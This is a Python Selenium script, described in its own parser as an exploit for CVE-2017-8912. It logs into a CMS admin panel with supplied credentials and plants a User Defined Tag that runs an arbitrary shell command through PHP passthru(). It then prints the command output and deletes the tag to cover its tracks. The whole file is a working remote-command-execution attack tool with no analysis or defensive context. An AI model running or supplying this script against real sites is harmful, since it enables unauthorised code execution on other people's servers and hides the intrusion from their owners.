from argparse import ArgumentParser, RawTextHelpFormatter
import random
import string
from huepy import *
from typing import List
from selenium.webdriver.firefox.webdriver import WebDriver, Options
from selenium.webdriver.firefox.webelement import FirefoxWebElement as WebElement
from selenium.common.exceptions import NoSuchElementException, TimeoutException, NoAlertPresentException
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
import selenium.webdriver.support.expected_conditions as EC
import time
_ = ""
parser = ArgumentParser(description="Exploit for CVE-2017-8912",
                        formatter_class=RawTextHelpFormatter)

parser.add_argument("--target",
                    "-t",
                    required=True,
                    help="target with CMS path and protocol",
                    dest="t")
parser.add_argument("--username",
                    "-u",
                    required=True,
                    help="username",
                    dest="u")
parser.add_argument("--password",
                    "-p",
                    required=True,
                    help="password",
                    dest="p")
parser.add_argument("--command",
                    "-c",
                    help="command to execute (default: whoami)",
                    default="whoami",
                    dest="c")
parser.add_argument("--timeout",
                    "-T",
                    type=int,
                    default=1,
                    dest="timeout",
                    help="execution timeout in secs (default: 1)")
parser.add_argument("--debug",
                    action="store_false",
                    default=True,
                    help="if passed, show the firefox window",
                    dest="debug")

args = parser.parse_args()
if args.t.endswith("/"):
    args.t = args.t[:-1]

U = ''.join(random.choices(string.ascii_uppercase + string.digits, k=15))

opt = Options()
opt.headless = args.debug
driver = WebDriver(options=opt)
driver.maximize_window()
print(info("Logging in"))
driver.get("%s/admin/login.php" % args.t)
u = driver.find_element_by_xpath("//input[@id='lbusername']").send_keys(args.u)
p = driver.find_element_by_xpath("//input[@id='lbpassword']").send_keys(args.p)
driver.find_element_by_xpath(
    "//body/div[@id='wrapper']/div[1]/div[1]/form[1]/fieldset[1]/input[3]"
).click()

try:
    WebDriverWait(driver, args.timeout).until(
        EC.visibility_of_element_located(
            (By.XPATH,
             "//div[contains(text(),'User name or password incorrect')]")))
    print(bad("User name or password incorrect"))
    driver.quit()
    exit(1)
except TimeoutException:
    print(good("Successfully Logged in"))

driver.find_element_by_xpath(
    "//span[contains(text(),'Open/Close Extensions')]").click()
last_height = driver.execute_script("return document.body.scrollHeight")
while True:
    driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
    time.sleep(args.timeout)
    new_height = driver.execute_script("return document.body.scrollHeight")
    if new_height == last_height:
        break
    last_height = new_height
driver.find_element_by_xpath(
    "//body/div[@id='oe_container']/div[@id='oe_admin-content']/div[@id='oe_sidebar']/aside[1]/nav[1]/ul[1]/li[5]/ul[1]/li[6]/a[1]"
).click()
driver.find_element_by_xpath(
    "//a[contains(text(),'Add User Defined Tag')]").click()
print(info("Creating vulnerable user tag"))
driver.find_element_by_xpath("//input[@id='name']").send_keys(U)
driver.find_element_by_xpath("//textarea[@id='udtcode']").send_keys(
    "passthru('%s');" % args.c)
driver.find_element_by_xpath("//button[@id='submitme']").click()
try:
    table: WebElement = WebDriverWait(driver, args.timeout).until(
        EC.presence_of_element_located((
            By.XPATH,
            "//body/div[@id='oe_container']/div[@id='oe_admin-content']/div[@id='oe_mainarea']/article[1]/section[1]/div[1]/div[1]/table[1]"
        )))
except TimeoutException:
    print(bad("Table not found"))
    driver.quit()
    exit(1)
rows: List[WebElement] = table.find_elements_by_tag_name("tr")
for row in rows:
    to_break = False
    links: List[WebElement] = row.find_elements_by_tag_name("a")
    if len(links) == 0: continue
    for link in links:
        if link.text == U:
            to_break = True
            print(good("Found user tag: %s" % U))
            link.click()
            break
    if to_break:
        break
else:
    print(bad("User tag not found"))
    driver.quit()
    exit(1)

print(info("Executing payload"))
driver.find_element_by_xpath("//button[@id='runbtn']").click()
driver.switch_to.alert.accept()
try:
    result: WebElement = WebDriverWait(driver, args.timeout).until(
        EC.visibility_of_element_located(
            (By.XPATH, "//div[@id='edit_userplugin_runout']")))
    print(good("Found result"))
    _ = result.text
    driver.find_element_by_xpath("//body/div[5]/div[1]/button[1]").click()
except TimeoutException:
    print(bad("Failed to execute payload"))
    pass

driver.find_element_by_xpath(
    "//a[contains(text(),'User Defined Tags')]").click()
table: WebElement = WebDriverWait(driver, args.timeout).until(
    EC.presence_of_element_located((
        By.XPATH,
        "//body/div[@id='oe_container']/div[@id='oe_admin-content']/div[@id='oe_mainarea']/article[1]/section[1]/div[1]/div[1]/table[1]"
    )))
rows: List[WebElement] = table.find_elements_by_tag_name("tr")
for row in rows:
    to_break = False
    links: List[WebElement] = row.find_elements_by_tag_name("a")
    if len(links) == 0: continue
    for link in links:
        if link.text == U:
            to_break = True
            print(info("Cleaning user tag: %s" % U))
            links[-1].click()
            no_alert = True
            while no_alert:
                try:
                    driver.switch_to.alert.accept()
                    no_alert = False
                except NoAlertPresentException:
                    pass
            print(good("Removed user tag: %s" % U))
            break
    if to_break:
        break
else:
    print(bad("User tag not found"))
    driver.quit()
    exit(1)
print(info("Command output"))
print(_)

driver.quit()